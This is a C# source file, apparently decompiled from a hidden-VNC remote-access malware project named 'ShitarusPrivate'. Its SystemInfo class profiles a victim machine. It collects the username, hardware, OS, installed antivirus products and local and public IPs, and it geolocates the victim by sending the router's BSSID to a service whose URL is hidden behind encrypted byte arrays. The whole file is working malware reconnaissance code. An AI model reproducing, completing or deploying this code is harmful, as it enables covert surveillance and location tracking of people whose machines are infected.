using System;
using System.Collections.Generic;
using System.Drawing;
using System.Globalization;
using System.Linq;
using System.Management;
using System.Net;
using System.Net.NetworkInformation;
using System.Net.Sockets;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Windows.Forms;
using Microsoft.Win32;

namespace ShitarusPrivate.HVNC.Helpers
{
    internal sealed class SystemInfo
    {
        [Serializable]
        [CompilerGenerated]
        private sealed class __c
        {
            public static readonly __c __9 = new __c();

            public static Func<NetworkInterface, bool> __9__10_0;

            public static Func<NetworkInterface, bool> __9__10_1;

            public static Func<NetworkInterface, IEnumerable<GatewayIPAddressInformation>> __9__10_2;

            public static Func<GatewayIPAddressInformation, IPAddress> __9__10_3;

            public static Func<IPAddress, bool> __9__10_4;

            internal bool _GetDefaultGateway_b__10_0(NetworkInterface n)
            {
                return n.OperationalStatus == OperationalStatus.Up;
            }

            internal bool _GetDefaultGateway_b__10_1(NetworkInterface n)
            {
                return n.NetworkInterfaceType != NetworkInterfaceType.Loopback;
            }

            internal IEnumerable<GatewayIPAddressInformation> _GetDefaultGateway_b__10_2(NetworkInterface n)
            {
                return n.GetIPProperties()?.GatewayAddresses;
            }

            internal IPAddress _GetDefaultGateway_b__10_3(GatewayIPAddressInformation g)
            {
                return g?.Address;
            }

            internal bool _GetDefaultGateway_b__10_4(IPAddress a)
            {
                return a != null;
            }
        }

        public static string Username = Environment.UserName;

        public static string Compname = Environment.MachineName;

        public static string Culture = CultureInfo.CurrentCulture.ToString();

        public static readonly string Datenow = DateTime.Now.ToString("yyyy-MM-dd h:mm:ss tt");

        [DllImport("iphlpapi.dll", ExactSpelling = true)]
        private static extern int SendARP(int destIp, int srcIp, byte[] macAddr, ref uint physicalAddrLen);

        public static string ScreenMetrics()
        {
            Rectangle bounds = Screen.GetBounds(Point.Empty);
            int width = bounds.Width;
            int height = bounds.Height;
            return width + "x" + height;
        }

        public static string GetBattery()
        {
            try
            {
                string text = SystemInformation.PowerStatus.BatteryChargeStatus.ToString();
                string[] array = SystemInformation.PowerStatus.BatteryLifePercent.ToString(CultureInfo.InvariantCulture).Split(',');
                string text2 = array[array.Length - 1];
                return text + " (" + text2 + "%)";
            }
            catch
            {
            }
            return "Unknown";
        }

        private static string GetWindowsVersionName()
        {
            string text = "Unknown System";
            try
            {
                using ManagementObjectSearcher managementObjectSearcher = new ManagementObjectSearcher("root\\CIMV2", " SELECT * FROM win32_operatingsystem");
                foreach (ManagementBaseObject item in managementObjectSearcher.Get())
                {
                    ManagementObject managementObject = (ManagementObject)item;
                    text = Convert.ToString(managementObject["Name"]);
                }
                text = text.Split('|')[0];
                int length = text.Split(' ')[0].Length;
                text = text.Substring(length).TrimStart().TrimEnd();
                return text;
            }
            catch
            {
                return text;
            }
        }

        private static string GetBitVersion()
        {
            try
            {
                return Registry.LocalMachine.OpenSubKey("HARDWARE\\Description\\System\\CentralProcessor\\0").GetValue("Identifier").ToString()
                    .Contains("x86") ? "(32 Bit)" : "(64 Bit)";
            }
            catch
            {
            }
            return "(Unknown)";
        }

        public static string GetSystemVersion()
        {
            return GetWindowsVersionName() + " " + GetBitVersion();
        }

        public static string GetDefaultGateway()
        {
            try
            {
                return NetworkInterface.GetAllNetworkInterfaces().Where(__c.__9__10_0 ?? (__c.__9__10_0 = __c.__9._GetDefaultGateway_b__10_0)).Where(__c.__9__10_1 ?? (__c.__9__10_1 = __c.__9._GetDefaultGateway_b__10_1))
                    .SelectMany(__c.__9__10_2 ?? (__c.__9__10_2 = __c.__9._GetDefaultGateway_b__10_2))
                    .Select(__c.__9__10_3 ?? (__c.__9__10_3 = __c.__9._GetDefaultGateway_b__10_3))
                    .Where(__c.__9__10_4 ?? (__c.__9__10_4 = __c.__9._GetDefaultGateway_b__10_4))
                    .FirstOrDefault()?.ToString();
            }
            catch
            {
            }
            return "Unknown";
        }

        public static string GetAntivirus()
        {
            try
            {
                using ManagementObjectSearcher managementObjectSearcher = new ManagementObjectSearcher("\\\\" + Environment.MachineName + "\\root\\SecurityCenter2", "Select * from AntivirusProduct");
                List<string> list = new List<string>();
                foreach (ManagementBaseObject item in managementObjectSearcher.Get())
                {
                    list.Add(item["displayName"].ToString());
                }
                if (list.Count == 0)
                {
                    return "Not installed";
                }
                return string.Join(", ", list.ToArray()) + ".";
            }
            catch
            {
            }
            return "N/A";
        }

        public static string GetLocalIp()
        {
            try
            {
                IPHostEntry hostEntry = Dns.GetHostEntry(Dns.GetHostName());
                IPAddress[] addressList = hostEntry.AddressList;
                foreach (IPAddress iPAddress in addressList)
                {
                    if (iPAddress.AddressFamily == AddressFamily.InterNetwork)
                    {
                        return iPAddress.ToString();
                    }
                }
            }
            catch
            {
            }
            return "No network adapters with an IPv4 address in the system!";
        }

        public static string GetPublicIp()
        {
            try
            {
                return new WebClient().DownloadString(StringsCrypt.Decrypt(new byte[32]
                {
                    23, 61, 220, 157, 111, 249, 43, 180, 122, 28,
                    107, 102, 60, 187, 44, 39, 44, 238, 221, 5,
                    238, 56, 3, 133, 224, 68, 195, 226, 41, 226,
                    22, 191
                })).Replace("\n", "");
            }
            catch (Exception)
            {
                Logging.Log();
            }
            return "Request failed";
        }

        private static string GetBssid()
        {
            byte[] array = new byte[6];
            uint physicalAddrLen = (uint)array.Length;
            try
            {
                string defaultGateway = GetDefaultGateway();
                if (SendARP(BitConverter.ToInt32(IPAddress.Parse(defaultGateway).GetAddressBytes(), 0), 0, array, ref physicalAddrLen) != 0)
                {
                    return "unknown";
                }
                string[] array2 = new string[physicalAddrLen];
                for (int i = 0; i < physicalAddrLen; i++)
                {
                    array2[i] = array[i].ToString("x2");
                }
                return string.Join(":", array2);
            }
            catch
            {
            }
            return "Failed";
        }

        public static string GetLocation()
        {
            string bssid = GetBssid();
            string text = "Unknown";
            string text2 = "Unknown";
            string text3 = "Unknown";
            string text4;
            try
            {
                using WebClient webClient = new WebClient();
                text4 = webClient.DownloadString(StringsCrypt.Decrypt(new byte[64]
                {
                    239, 87, 16, 244, 130, 200, 219, 198, 121, 223,
                    110, 28, 218, 166, 27, 2, 253, 239, 236, 54,
                    11, 159, 146, 91, 205, 36, 0, 49, 166, 93,
                    22, 23, 221, 210, 170, 52, 17, 123, 35, 113,
                    33, 136, 114, 109, 224, 65, 139, 150, 160, 210,
                    179, 207, 197, 164, 182, 82, 86, 244, 231, 174,
                    68, 222, 51, 47
                }) + bssid);
            }
            catch
            {
                return "BSSID: " + bssid;
            }
            if (!text4.Contains("{\"result\":200"))
            {
                return "BSSID: " + bssid;
            }
            int num = 0;
            string[] array = text4.Split(' ');
            string[] array2 = array;
            foreach (string text5 in array2)
            {
                num++;
                if (text5.Contains("\"lat\":"))
                {
                    text = array[num].Replace(",", "");
                }
                if (text5.Contains("\"lon\":"))
                {
                    text2 = array[num].Replace(",", "");
                }
                if (text5.Contains("\"range\":"))
                {
                    text3 = array[num].Replace(",", "");
                }
            }
            string text6 = "BSSID: " + bssid + "\nLatitude: " + text + "\nLongitude: " + text2 + "\nRange: " + text3;
            if (text != "Unknown" && text2 != "Unknown")
            {
                text6 = text6 + "\n[Open google maps](" + StringsCrypt.Decrypt(new byte[48]
                {
                    59, 129, 195, 34, 227, 242, 76, 173, 34, 247,
                    140, 112, 238, 245, 161, 60, 49, 127, 57, 59,
                    227, 89, 70, 152, 32, 242, 56, 102, 234, 75,
                    63, 18, 228, 223, 4, 147, 131, 146, 214, 158,
                    87, 69, 119, 232, 58, 195, 55, 105
                }) + text + " " + text2 + ")";
            }
            return text6;
        }

        public static string GetCpuName()
        {
            try
            {
                ManagementObjectSearcher managementObjectSearcher = new ManagementObjectSearcher("root\\CIMV2", "SELECT * FROM Win32_Processor");
                using ManagementObjectCollection.ManagementObjectEnumerator managementObjectEnumerator = managementObjectSearcher.Get().GetEnumerator();
                if (managementObjectEnumerator.MoveNext())
                {
                    ManagementBaseObject current = managementObjectEnumerator.Current;
                    ManagementObject managementObject = (ManagementObject)current;
                    return managementObject["Name"].ToString();
                }
            }
            catch
            {
            }
            return "Unknown";
        }

        public static string GetGpuName()
        {
            try
            {
                ManagementObjectSearcher managementObjectSearcher = new ManagementObjectSearcher("root\\CIMV2", "SELECT * FROM Win32_VideoController");
                using ManagementObjectCollection.ManagementObjectEnumerator managementObjectEnumerator = managementObjectSearcher.Get().GetEnumerator();
                if (managementObjectEnumerator.MoveNext())
                {
                    ManagementBaseObject current = managementObjectEnumerator.Current;
                    ManagementObject managementObject = (ManagementObject)current;
                    return managementObject["Name"].ToString();
                }
            }
            catch
            {
            }
            return "Unknown";
        }

        public static string GetRamAmount()
        {
            try
            {
                int num = 0;
                using (ManagementObjectSearcher managementObjectSearcher = new ManagementObjectSearcher("Select * From Win32_ComputerSystem"))
                {
                    using ManagementObjectCollection.ManagementObjectEnumerator managementObjectEnumerator = managementObjectSearcher.Get().GetEnumerator();
                    if (managementObjectEnumerator.MoveNext())
                    {
                        ManagementBaseObject current = managementObjectEnumerator.Current;
                        ManagementObject managementObject = (ManagementObject)current;
                        double num2 = Convert.ToDouble(managementObject["TotalPhysicalMemory"]);
                        num = (int)(num2 / 1048576.0);
                    }
                }
                return num + "MB";
            }
            catch
            {
            }
            return "-1";
        }
    }
}
